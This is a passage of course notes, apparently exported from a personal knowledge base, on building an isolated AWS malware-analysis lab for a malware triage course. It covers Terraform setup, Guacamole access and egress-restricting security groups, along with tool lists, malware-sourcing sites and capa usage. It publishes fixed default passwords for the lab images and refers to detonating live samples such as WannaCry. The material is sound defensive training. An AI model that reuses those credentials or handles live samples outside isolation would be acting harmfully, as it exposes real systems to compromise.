everything!</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#warning-this-stuff-aint-free","title":"WARNING: This Stuff Ain\u2019t Free","text":"<p>Cloud assets cost money.</p> <p>My philosophy for this course has always been that the initial sticker price is everything the student will ever have to pay. I can adhere to that philosophy when it comes to things like open source tools, free software, etc. But this is the one area of the course where you will pay more money to do the activities and you should know that ahead of time.</p> <p>How much more money, exactly? The good news is, not much. AWS cloud assets are very cheap and cost cents (US) per hour of run time. I do some rough calculations at the end of this section to show you how much you could reasonably expect to pay if you used the lab to do all of PMAT. TL;DR: with liberal estimates of usage, you should expect to pay somewhere between $3 and $9 USD if you use the cloud lab during the practical portions of this course.</p> <p>I disclaim responsibility if you leave your instances running and forget to terminate them and rack up a huge AWS bill!</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#first-credit","title":"First, Credit","text":"<p>I give the credit for this section squarely to PMAT student Adan Alvarez (@Flekyy90), who created the GitHub repository that contained the original code that I modified to use in this section. I used the code in his repository as a skeleton and made some tweaks to fit the PMAT lab environment. He did outstanding work on the original repo and deserves tons of credit for it. Thank you, Adan!</p> <p>https://twitter.com/Flekyy90/status/1594390758010015744</p> <p>Please go show him some love!</p> <p>adanalvarez - Overview</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#requirements","title":"Requirements","text":"<p>To build a cloud lab, you need the following:</p> <pre><code>A workstation with a terminal where you\u2019ll run your cloud provisioning commands.\nI recommend the Windows Subsystem for Linux (WSL) for this purpose.\nAlternatively, any Ubuntu host will work.\n</code></pre> <ul> <li>Terraform</li> </ul> <pre><code>wget -O- https://apt.releases.hashicorp.com/gpg | gpg --dearmor | sudo tee /usr/share/keyrings/hashicorp-archive-keyring.gpg\necho \"deb [signed-by=/usr/share/keyrings/hashicorp-archive-keyring.gpg] https://apt.releases.hashicorp.com $(lsb_release -cs) main\" | sudo tee /etc/apt/sources.list.d/hashicorp.list\nsudo apt update &amp;&amp; sudo apt install terraform -y\n</code></pre> <ul> <li>jq</li> </ul> <pre><code>sudo apt install jq -y\n</code></pre> <ul> <li>awscli</li> </ul> <pre><code>sudo apt install awscli -y\n</code></pre> <pre><code>An AWS account. Go to the main AWS page and click \u201cCreate an AWS Account\u201d to get started.\nA way to pay for the compute that you will use.\n</code></pre>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#create-your-terraform-iam-user","title":"Create your terraform IAM User","text":"<p>We will now use the AWS Identity and Account Management service (IAM) to create a user. This user\u2019s job is to spin up and tear down cloud VMs on our behalf. We will use it in conjunction with Terraform to build our lab.</p> <ul> <li>Go to https://console.aws.amazon.com/iam/ and sign in.</li> <li>In the IAM resources table, click on Users.</li> <li>Click Add User<ul> <li>Name: terraform</li> <li>Click Next</li> <li>Keep the Permissions Options as \u201cAs user to group\u201d</li> <li>Under User Groups, check the box for EC2FullAccess</li> <li>Click next.</li> <li>Review the options and click Create User</li> </ul> </li> <li>Back in the IAM &gt; Users section, click on the name of the new terraform user</li> <li>Go to the Security Credentials tab</li> <li>Scroll down to the Access keys section</li> <li>Click \u201cCreate Access Key\u201d</li> <li>From the options on the \u201cAccess key best practices &amp; alternatives\u201d section, select \u201cCommand Line Interface\u201d</li> <li>Check the box for \u201cI understand the above recommendation and want to proceed to create an access key.\u201d and select Next.</li> <li>Select \u201cCreate Access Key\u201c</li> <li>When your new access key is created, you can click on the key and click \u201cShow\u201d to view the access key\u2019s secret.</li> </ul> <p>THE ACCESS KEY SECRET IS A PASSWORD. KEEP IT SAFE. </p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#configure-awscli","title":"Configure awscli","text":"<p>We will set up awscli to use our access key securely.</p> <ul> <li>In your Linux terminal, after installing <code>awscli</code>, enter: <code>aws configure</code></li> <li>For each prompt, enter the following:<ul> <li>AWS Access Key ID: [enter the terraform user\u2019s access key ID]</li> <li>AWS Secret Access Key: [enter the terraform user\u2019s secret key]</li> <li>Default region name: [enter your desired default region. If you plan on using the PMAT AMIs, enter us-east-1]</li> <li>Default output format: <code>json</code></li> </ul> </li> </ul> <p>Now, <code>awscli</code> has securely configured our credentials so Terraform can use them to provision cloud hosts.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#creating-the-lab","title":"Creating the Lab","text":"<p>High-level Network Architecture</p> <p></p> <p>The architecture for the cloud analysis lab network accomplishes a few things:</p> <ul> <li>It allows our two analysis workstations to communicate on a Virtual Private Cloud (VPC) network (10.0.0.0/24)</li> <li>It blocks all ingress traffic unless it originates from within the analysis VPC, with one exception (our Apache Guacamole jump-box).</li> <li>By default, the security groups prevent our analysis workstations from accessing anything outside of this VPC. We will also have the option to change the security groups to allow outbound internet access.</li> <li>It allows any PMAT student anywhere in the world to access an Apache Guacamole jump-box that can use RDP, SSH, and VNC to access the isolated analyst workstations.</li> <li>It enforces a security group rule that only allows the public IP address of a PMAT student to access the public IP of Apache Guacamole on port 443. This rule is dynamically generated when the network is created.</li> </ul>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#lab-workstation-images","title":"Lab Workstation Images","text":"<p>For this course, I have made two Amazon Machine Images (AMIs) for use in this section. These two AMIs are pre-fabricated images of FLARE-VM and REMnux for use during the course. They are both publicly available.</p> <p>I will consider the creation of AMIs to be out of scope for this section. Do note that if you want to make your own FLARE-VM and/or REMnux AMI and use them, AWS allows you to do so. The process for creating a FLARE-VM and REMnux AMI is basically the same as when you do it in a local lab. The only difference is that you run the FLARE-VM installation scripts on a running instance of Windows Server 2019/2022 on AWS and then save that instance as your AMI.</p> <p>Adan\u2019s walkthrough has more information about how to do this process:</p> <p>https://github.com/adanalvarez/AWS-malware-lab</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#pmat-cloud-amis-credentials","title":"PMAT Cloud AMIs &amp; Credentials","text":"<pre><code>PMAT-FLAREVM-BASE AMI: `ami-0432b4a6451f79442`\nUsername: `Administrator`\nPassword: `PLEASEchangeThisPassword123`\nPMAT-REMNUX-BASE AMI: `ami-0e17adcda27f0edf2`\nUsername: `remnux`\nPassword: `malware`\n</code></pre> <p>The PMAT AMIs are only available in the AWS us-east-1 region. You must use this region if you want to use the PMAT AMIs.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#lab-provisioning-with-terraform","title":"Lab Provisioning With Terraform","text":"<p>We will use Apache Guacamole as our jump-point to access the isolated lab. As such, we need to subscribe to the Apache Guacamole AMI that is maintained by Bitnami. The AMI itself is free and only costs the compute to run it while it is provisioned.</p> <p>The AMI is available here:</p> <p>Apache Guacamole packaged by Bitnami https://aws.amazon.com/marketplace/pp?sku=6sq2ud425j12tj4didc8xzf6m</p> <p>After subscribing, you can go to your AWS Subscriptions to recover the AMI number.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#clone-the-pmat-lab-repository-to-your-workstation","title":"Clone the PMAT-lab repository to your workstation","text":"<p>Clone the PMAT-labs repository to your host:</p> <pre><code>git clone https://github.com/HuskyHacks/PMAT-labs\n</code></pre> <p>Change directories into the <code>PMAT-labs/aws-lab/</code> directory and examine the contents.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#configure-the-terraform-files","title":"Configure the Terraform files","text":"<p>The code in this directory sets up the skeleton of the AWS malware analysis lab. We have to make a few tweaks before it will run.</p> <ul> <li>In the aws-lab directory, create a file called shared.auto.tfvars.json and copy in the following, making alterations when necessary:</li> </ul> <pre><code>{ \n    \"environment\": \"pmat-lab\",\n    \"flarevm-ami\": \"ami-0432b4a6451f79442\",\n    \"guacamole-ami\": \"ami-XXXXXXXXXXXXXXXXX\",\n    \"remnux-ami\": \"ami-0e17adcda27f0edf2\",\n    \"account\": \"############\",\n    \"region\": \"us-east-1\",\n    \"availability_zone\": \"us-east-1a\",\n    \"enable_guacamole\": true\n}\n</code></pre> <p>\u2026 where:</p> <ul> <li>'flarevm-ami': this is the public AMI for the PMAT-FLAREVM-BASE image.</li> <li>'guacamole-ami': Use the AMI string that you get after you subscribe to the Bitnami Apache Guacamole AMI.</li> <li>'remnux-ami': this is the public AMI for the PMAT-REMNUX-BASE image.</li> <li>'account': this is your own IAM account number for the 'terraform' user that you created. Go to the IAM section in AWS and look at the \u201cAccount ID\u201d field on the right side. The 'account' number is that 12 digit number.</li> <li>'region': the PMAT AMIs are only available in us-east-1. If you build your own AMIs, you build them in any region you want.</li> <li>'availability_zone': the PMAT AMIs are only available in us-east-1a. If you build your own AMIs, you build them in any region you want.</li> <li>'enable_guacamole': leave as 'true' to use Apache Guacamole</li> </ul> <p>Once the 'shared.auto.tfvars.json' is set, we can initialize, plan, and apply our Terraform configuration.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#configure-terraform-launch-the-lab","title":"Configure Terraform &amp; Launch the Lab","text":"<p>The Terraform code in the aws-lab directory does most of the heavy lifting here. Make sure you are in the aws-labs directory. Now, all we have to do is run the following commands:</p> <pre><code>terraform init\n</code></pre> <p></p> <p>The <code>init</code> command initializes the working directory where all of the files that will make up our Terraform lab will reside.</p> <p>Following the <code>init</code> command, we run the Terraform <code>plan</code> command:</p> <pre><code>terraform plan\n</code></pre> <p></p> <p>The <code>plan</code> command creates an execution plan, which lets you preview the changes that Terraform plans to make to your infrastructure. We can see exactly what Terraform is going to provision for us.</p> <p>Finally, if we don\u2019t have any errors, we can run the <code>apply</code> command to provision our lab:</p> <pre><code>terraform apply\n</code></pre> <p></p> <p>Once you input \"yes\", Terraform goes to work:</p> <p></p> <p>The provisioning will continue for about 6 minutes. If you look in your AWS EC2 dashboard panel, you will see your lab spring to life!</p> <p></p> <p>At the end of the provisioning, you will see the username, password, and public IP address of the Guacamole server.</p> <p>Important Note: The security groups are configured to only allow your own public IP address to connect to the Guacamole server on HTTPS to keep our lab secure. It is generally not a good idea to leave your instances open to the internet. Wherever you can, make sure to lock down your firewall rules so only your IP address can access your instances!</p> <p>The username for our Guacamole server is always <code>guacadmin</code>. The password is randomly generated each time. The public IP address of the Guacamole server is assigned at provisioning and will also change between deployments:</p> <p></p> <p>The two IP addresses in the <code>10.0.0.0/24</code> network are for FLARE-VM and REMnux. The two hosts are located on an isolated AWS subnet. These two hosts are accessible via Apache Guacamole but do not have any connectivity to the rest of the world.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#access-configure-apache-guacamole","title":"Access &amp; Configure Apache Guacamole","text":"<p>We will use the Guacamole server for our jump-point into our analysis network.</p> <p>Go to <code>https://[guacamole IP address]</code> to access the Guacamole server and accept the insecurity warning.</p> <p>Sign in with the credentials from the Terraform output. Then, on the main Guacamole page, go to the guacadmin drop down and select Settings:</p> <p></p> <p>Click on Connections and click New Connection:</p> <p></p> <p>First, we will input the connection information for FLARE-VM.</p> <ul> <li>In the Name field, enter: flarevm</li> <li>In the Protocol field, change it to RDP.</li> <li>Scroll down to the Parameters section. In the Network fields, enter 10.0.0.4 for the Hostname and 3389 for the port.</li> <li>Enter Administrator for the username and PLEASEchangeThisPassword123 for the password.</li> <li>Check the box for Ignore Server Certificate</li> </ul> <p></p> <p>Once these options are set, scroll down and select Save.</p> <p>Check the connection by returning to the main page and selecting the <code>flarevm</code> connection that is now available. After a brief moment, the FLARE-VM desktop should render in the browser.</p> <p></p> <p></p> <p>Note that the FLARE-VM logo will not be present as we are currently in an RDP session.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#access-configure-remnux","title":"Access &amp; Configure REMnux","text":"<p>Return to the configuration section and add a new connection as we did before. This time, name it <code>remnux-ssh</code> and set the protocol to SSH.</p> <p></p> <p>In the parameters section, set the Hostname field to <code>10.0.0.6</code> and the Port to 22.</p> <p>Set the Username and Password fields to <code>remnux</code> and <code>malware</code>, respectively.</p> <p>Click Save once the options are set.</p> <p>Return to the Home page and select the <code>remnux-ssh</code> connection to start an SSH session on REMnux:</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#configure-vnc-on-remnux","title":"Configure VNC on REMNux","text":"<p>There is also a VNC server available on REMnux for those that want GUI access. Simply run the <code>vncRun.sh</code> script located in the <code>remnux</code> user\u2019s home directory.</p> <p></p> <p>Once the VNC server is running, make a new connection in the Guacamole connections section to use VNC:</p> <p></p> <p>Now, VNC Desktop view is available for REMnux:</p> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#switching-flare-vm-back-to-internet-access","title":"Switching FLARE-VM Back to Internet Access","text":"<p>If you need FLARE-VM to access the internet to download the PMAT-lab repo or a tool that didn\u2019t install correctly, the <code>security_group_flarevm outbound_internet</code> security group allows outbound access to all IP addresses on all ports/protocols. It is configured as a security group for the lab VPC.</p> <p>To switch over, go to the FLARE-VM instance from within EC2:</p> <p></p> <p>Then click <code>Actions -&gt; Security \u2192 Change Security Groups</code></p> <p></p> <p>Then remove the <code>no_internet</code> security group and add the <code>outbound_internet</code> security group and click Save.</p> <p>https://cdn.fs.teachablecdn.com/ADNupMnWyR7kCWRvm76Laz/https://www.filepicker.io/api/file/SruXHjwySAuhp48HeH2l</p> <p>Then remove the no_internet security group and add the outbound_internet security group and click Save.</p> <p></p> <p>After you\u2019re done, remember to remove the <code>outbound_internet</code> security group and re-add the <code>no_internet</code> security group.</p> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#reverting-flare-vm-after-detonation","title":"Reverting FLARE-VM After Detonation","text":"<p>To revert FLARE-VM to a clean state after detonation, we can issue the Terraform <code>apply</code> command and specify to replace the FLARE-VM host.</p> <pre><code>terraform apply -replace=aws_instance.flarevm\n</code></pre>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#destroy-the-lab","title":"Destroy the Lab","text":"<p>Please, please, PLEASE remember to destroy your lab when you are done using it.</p> <p>The destroy command will stop and terminate all running instances in the Terraform config. This prevents you from burning compute and racking up a bill!</p> <p>To destroy the instances of the lab entirely, we can issue the Terraform <code>destroy</code> command:</p> <pre><code>terraform destroy\n</code></pre> <p>Note that the Terraform configuration can still pull from the specified AMIs to make new instances. You will, however, need to configure the Guacamole server and download any additional tools that you want.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#on-cloud-malware-analysis-safety","title":"On Cloud Malware Analysis Safety","text":"<p>The differences between a local malware analysis lab and a cloud-based lab are worth discussing. In some ways, analysis is identical no matter where you perform it. But in other ways, analyzing malware in the cloud has stipulations.</p> <p>If we examine the AWS security groups present in the Terraform documents, we can see how the cloud lab network is set up.</p> <p>Each instance in the lab has specific security group configurations that are added to the instance when it provisions. For example, examine the FLARE-VM instance configuration:</p> <pre><code># Create Security groups FlareVM - no internet\nresource \"aws_security_group\" \"security_group_flarevm_no_internet\" {\n  count       = var.enable_guacamole ? 1 : 0\n  name        = \"security_group_flarevm no_internet\"\n  description = \"Allow inbound from local subnet\"\n  vpc_id      = aws_vpc.lab_vpc.id\n\n\n  ingress {\n    description = \"Allow inbound traffic from local subnet\"\n    from_port   = 0\n    to_port     = 0\n    protocol    = \"-1\"\n    cidr_blocks = [\"10.0.0.0/24\"]\n  }\n\n\n  egress {\n    description = \"Allow outbound to local subnet\"\n    from_port   = 0\n    to_port     = 0\n    protocol    = \"-1\"\n    cidr_blocks = [\"10.0.0.0/24\"]\n  }\n\n\n  tags = {\n    Name = \"${var.environment}-flarevm-no-internet\"\n  }\n}\n</code></pre> <p>This security group restricts the FLARE-VM instance from accessing anything outside the lab subnet (10.0.0.0/24). Traffic within the local subnet is not restricted. Malware that detonates on FLARE-VM can access any endpoint in the analysis network on any port. But it cannot traverse from the analysis subnet to the outside world because the egress rule is limited to the CIDR block of the analysis network. REMnux has a similar configuration.</p> <p>Conversely, the alternate security group that allows internet access opens the egress subnet to all addresses (0.0.0.0/0):</p> <pre><code># Create Security groups FlareVM - with outbound internet\nresource \"aws_security_group\" \"security_group_flarevm_outbound_internet\" {\n  count       = var.enable_guacamole ? 1 : 0\n  name        = \"security_group_flarevm outbound_internet\"\n  description = \"Allow outbound internet access\"\n  vpc_id      = aws_vpc.lab_vpc.id\n\ningress {\n    description = \"Allow RDP inbound traffic\"\n    from_port   = 3389\n    to_port     = 3389\n    protocol    = \"tcp\"\n    cidr_blocks = [\"10.0.0.5/32\"]\n  }\n\n  egress {\n    description = \"Allow all protocols outbound to any subnet\"\n    from_port   = 0\n    to_port     = 0\n    protocol    = \"-1\"\n    cidr_blocks = [\"0.0.0.0/0\"]\n  }\n\n  tags = {\n    Name = \"${var.environment}-flarevm-internet\"\n  }\n}\n</code></pre> <p>When this security group is applied, the instances can reach the open internet. Consider this to be the same thing as putting a local VM back on the NAT network to download a tool or malware sample.</p> <p>The only instance that is different here is Apache Guacamole, which is our jump-box that allows us to access the isolated malware analysis lab without exposing our own physical host to the analysis endpoints. Guacamole acts as a proxy for our access into the network. We access it via HTTPS and it, in turn, accesses each instance via SSH, RDP, and/or VNC.</p> <p>The Guacamole server limits the ingress traffic to only allow a single IP address on port 443. The only allowed IP address is dynamically assigned from the output of checking <code>http://ipv4.icanhazip.com</code> and returning the result. This recovers your own public-facing IP address and adds it in as the allowed IP address for this security group rule in the line <code>[\"${chomp(data.http.myip.response_body)}/32\"]</code>:</p> <pre><code># Create Security Group for Guacamole\nresource \"aws_security_group\" \"security_group_guacamole\" {\n  count       = var.enable_guacamole ? 1 : 0\n  name        = \"security_group_guacamole\"\n  description = \"Allow HTTPS from the Internet\"\n  vpc_id      = aws_vpc.lab_vpc.id\n\n  ingress {\n    description      = \"Allow HTTPS inbound traffic\"\n    from_port        = 443\n    to_port          = 443\n    protocol         = \"tcp\"\n    cidr_blocks      = [\"${chomp(data.http.myip.response_body)}/32\"]\n  }\n\n  egress {\n    from_port        = 0\n    to_port          = 0\n    protocol         = \"-1\"\n    cidr_blocks      = [\"0.0.0.0/0\"]\n    ipv6_cidr_blocks = [\"::/0\"]\n  }\n\n  tags = {\n    Name = \"${var.environment}-guacamole\"\n  }\n}\n</code></pre> <p>All things considered, we now have:</p> <ul> <li>A private AWS malware analysis subnet (10.0.0.0/24)</li> <li>FLARE-VM that can talk to everything on our private malware analysis subnet but cannot talk to the outside world by default</li> <li>REMnux that has the same configuration as FLARE-VM</li> <li>Apache Guacamole that can communicate with the two internal hosts to start connection sessions but also allows your specific IP address to connect to it via HTTPS</li> <li>A set of other security group rules that allow the hosts to talk to the outside world should we need them.</li> </ul>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#costs","title":"Costs","text":"<p>Cloud resources are not free, but we do benefit from the smaller scale and overall simplicity of this setup.</p> <p>Normally, storing AMIs will cost about $3/month for a 60GB AMI. I am storing the AMIs and have made them available to the public, so you will not incur any cost for that. However, if you decide to build your own AMIs, that is the approximate cost.</p> <p>For the instances of the lab, each student will run three t2.medium servers for the duration of their practical work in the labs. AWS does not charge a user for instances unless those instances are actively running.</p> <p>A single t2.medium asset, at the time of writing this, costs about $0.04/hour to run. Let\u2019s use a liberal estimate and say that our three t2.medium servers will cost $.20/hour to run. PMAT has over 9 hours of content, plus an additional 10 or so hours of labs and challenges. If we assume a student runs this lab for the entire time, our numbers work out to .20 * 20 hours = $4 USD to run the lab.</p> <p>If we extrapolate that out, if a student were to let this lab run for an entire month straight without shutting the lab instances off, it would be $144 for the entire month. This should highlight the importance of shutting off your instances when you are not using them. But even though that seems expensive, the entire PMAT course will not take a straight month.</p> <p>I anticipate that the average amount of usage for a PMAT student to complete the labs, if they turn the labs on while using them and shut them off when they are done, would be between $3 and $9.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#summary","title":"Summary","text":"<p>We now have a rapid-deployable, pre-configured malware analysis cloud lab! We can use this lab to carry out all of the analysis in this course and beyond.</p> <p>Bonus: Cloudy with a Chance of Malware</p> <p>This is a talk that I gave at the Cloud Security Alliance of Southern California about the cloud lab infrastructure in this course. It covers the architecture of the lab and how we apply layered security to our cloud resources. It's a great place to reference when building your cloud lab.</p> <p> Cloudy with a Chance of Malware: Moving Malware Analysis to the Cloud </p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#course-lab-repo-link","title":"Course Lab Repo Link","text":"<p>The labs for this course are available here: <code>https://github.com/HuskyHacks/PMAT-labs</code></p> <p>This repo has all of the malware needed to complete this course. Please use this link and view the next video, \"Course Lab Repo Download &amp; Lab Orientation\" for instructions on how to get started with the repo.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#taking-a-snapshot-before-first-detonation","title":"Taking a Snapshot Before First Detonation","text":"<p>Sample for this section Ransomware.wannacry.exe.malz.7z</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#detonating-our-first-sample","title":"Detonating Our First Sample","text":"<p>Sample for this section:</p> <p>Lab file(s)</p> <p>Please Note: For this detonation, turn off INetSim before detonating. WannaCry will not detonate if INetSim is running.</p> <p>Why, you ask? You'll find that out at the end of the course!</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#course-tool-list-resources","title":"Course Tool List &amp; Resources","text":"<p>The following list is the full set of tools used in PMAT and their associated download resources. Please reference this list for any tools that fail to install or are no longer installed during the setup.</p> <p>FLARE-VM Tool List - strings/FLOSS - PEView - upx (not used but referenced) - PEStudio - Capa - Wireshark - Sysinternals (Procmon, TCPView) - nc/ncat - Cutter - x32/x64dbg - Process Hacker 2 (now known as System Informer) - scdbg - dnSpy/dnSpyEx - PEBear - YARA</p> <p>REMnux Tool List - base64 (built in Linux bin) - OLEdump - MobSF github | (Docker Container) - INetSim</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#basic-malware-handling","title":"Basic Malware Handling","text":"<p>Sample for this section:</p> <p>Lab file(s)</p> <p>Lab file(s)</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#safe-malware-sourcing-additional-resources","title":"Safe Malware Sourcing &amp; Additional Resources","text":"<p>References:</p> <ul> <li>PMAT Labs</li> <li>theZoo</li> <li>vx-underground main site</li> <li>vx-underground GitHub repo</li> <li>Zeltser Resources</li> <li>MalwareBazaar</li> </ul>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#2-basic-static-analysis","title":"2. Basic Static Analysis","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#hashing-malware-samples","title":"Hashing Malware Samples","text":"<p>Sample for this section: Lab file(s)</p> <p>Lab file(s)</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#malware-repositories-virustotal","title":"Malware Repositories: VirusTotal","text":"<p>https://www.virustotal.com/gui/home/upload</p> <p>Sample for this section: Lab file(s)</p> <p>Lab file(s)</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#strings-floss-static-string-analysis","title":"Strings &amp; FLOSS: Static String Analysis","text":"<p>Sample for this section: Lab file(s)</p> <p>Lab file(s)</p> <p>Tip: FLOSS can be run with the \"-n\" argument to specify your desired minimum string length. Sometimes, longer strings can be more useful to an analyst than your standard string of len(4).</p> <p>For example, if I want to pull all strings of length 6 or greater, I can issue the following command:</p> <pre><code>floss.exe -n 6 [malware_name.exe]\n</code></pre>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#analyzing-the-import-address-table","title":"Analyzing the Import Address Table","text":"<p>Sample for this section: Lab file(s)</p> <p>Lab file(s)</p> <p>Errata</p> <p>As of December 2022, the new FLARE-VM installation script does not contain all of the tools that are depicted in the course. Never fear! All of the tools in this course are available free and open source.</p> <p>The tool in this video, PEView, is available here: http://wjradburn.com/software/</p> <p>Click on that link and download PEView (http://wjradburn.com/software/PEview.zip) and add it to the FLARE-VM host.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#introduction-to-the-windows-api","title":"Introduction to the Windows API","text":"<p>Sample for this section: Lab file(s)</p> <p>Lab file(s)</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#malapiio","title":"MalAPI.io","text":"<p>Researcher @mrd0x released MalAPI.io, an online catalog of Windows APIs that are commonly used in malware. This is an incredible resource that helps to discern which APIs are worth scrutiny when performing analysis of the IAT.</p> <p>Site: https://malapi.io</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#to-pack-or-not-to-pack-packed-malware-analysis","title":"To Pack Or Not To Pack: Packed Malware Analysis","text":"<p>Sample for this section: Lab file(s)</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#combining-analysis-methods-pestudio","title":"Combining Analysis Methods: PEStudio","text":"<p>Sample for this section: Lab file(s)</p> <p>Lab file(s)</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#identifying-malware-capabilities-intro-to-mitre-attck","title":"Identifying Malware Capabilities &amp; Intro to MITRE ATT&amp;CK","text":"<p>Sample for this section: Lab file(s)</p> <p>Lab file(s)</p> <p>Our goal during basic static analysis is to triage correctly and as quickly as possible. Now that we've learned a bit about how to perform basic static analysis and how to correlate static indicators, let's deploy another tool that can assist in this phase and hopefully speed things up.</p> <p>Introducing, Capa: https://github.com/mandiant/capa</p> <p></p> <p>Capa is a program that detects malicious capabilities in suspicious programs by using a set of rules. These rules are meant to be as high-level and human readable as possible. For example, Capa will examine a binary, identify an API call or string of interest, and match this piece of information against a rule that is called \"receive data\" or \"connect to a URL\". It translates the technical information in a binary into a simple, human-readable piece of information.</p> <p>The program's primary strength is how it leverages rules. Capa has a default rule set, but also has an open-source repository of rules where anyone can contribute. You can see the Capa rule repository here: https://github.com/mandiant/capa-rules</p> <p>Let's learn more about this tool by using it on the binary we've already performed static analysis on, <code>Malware.Unknown.exe.malz</code>.</p> <p>On FLAREVM, run <code>capa -h</code> to see the usage menu:</p> <pre><code>C:\\Users\\husky\\Desktop\n\u03bb capa -h\nusage: capa.exe [-h] [--version] [-v] [-vv] [-d] [-q] [--color {auto,always,never}] [-f {auto,pe,sc32,sc64,freeze}] [-b {vivisect,smda}] [-r RULES] [-t TAG] [-j] sample\n\nThe FLARE team's open-source tool to identify capabilities in executable files.\n\npositional arguments:\nsample                path to sample to analyze\n\noptional arguments:\n-h, --help            show this help message and exit\n--version             show program's version number and exit\n-v, --verbose         enable verbose result document (no effect with --json)\n-vv, --vverbose       enable very verbose result document (no effect with --json)\n-d, --debug           enable debugging output on STDERR\n-q, --quiet           disable all output but errors\n--color {auto,always,never}\n                        enable ANSI color codes in results, default: only during interactive session\n-f {auto,pe,sc32,sc64,freeze}, --format {auto,pe,sc32,sc64,freeze}\n                        select sample format, auto: (default) detect file type automatically, pe: Windows PE file, sc32: 32-bit shellcode, sc64: 64-bit shellcode, freeze: features previously frozen by capa\n-b {vivisect,smda}, --backend {vivisect,smda}\n                        select the backend to use\n-r RULES, --rules RULES\n                        path to rule file or directory, use embedded rules by default\n-t TAG, --tag TAG     filter on rule meta field values\n-j, --json            emit JSON instead of text\n\nBy default, capa uses a default set of embedded rules.\nYou can see the rule set here:\n&lt;https://github.com/fireeye/capa-rules&gt;\n\nTo provide your own rule set, use the `-r` flag:\ncapa  --rules /path/to/rules  suspicious.exe\ncapa  -r      /path/to/rules  suspicious.exe\n\nexamples:\nidentify capabilities in a binary\n    capa suspicious.exe\n\nidentify capabilities in 32-bit shellcode, see `-f` for all supported formats\n    capa -f sc32 shellcode.bin\n\nreport match locations\n    capa -v suspicious.exe\n\nreport all feature match details\n    capa -vv suspicious.exe\n\nfilter rules by meta fields, e.g. rule name or namespace\n    capa -t \"create TCP socket\" suspicious.exe\n</code></pre> <p>Note: if Capa is not installed and accessible by running <code>capa</code> from the command line, please install the release binary for the program located at https://github.com/mandiant/capa/releases/tag/v4.0.1</p> <p>Capa has lots of command line options, but let's run it against Malware.Unknown.exe.malz with no arguments to see what the program looks like by default.</p> <p>Run capa <code>C:\\path\\to\\Malware.Unknown.exe.malz</code> to execute the program. Because I am in the Desktop directory, the command is <code>capa Malware.Unknown.exe.malz</code> in my example below:</p> <p></p> <p>Let's examine the results. Immediately, we see some boiler-plate information about the binary, like its hashes. But then, we get some interesting high-level information about the program.</p> <p>The first block in the output labeled \"ATT&amp;CK Tactic - ATT&amp;CK Technique\" is worth examining in depth.</p> <p></p> <p>What is ATT&amp;CK?</p> <p></p> <p>https://attack.mitre.org/</p> <p>The MITRE ATT&amp;CK Framework is a standard knowledge base of adversary tactics, techniques, and procedures (TTPs). MITRE ATT&amp;CK seeks to define and classify cyber adversary activity into groups based on what the activity seeks to accomplish and how the activity is carried out.</p> <p>In my professional life, 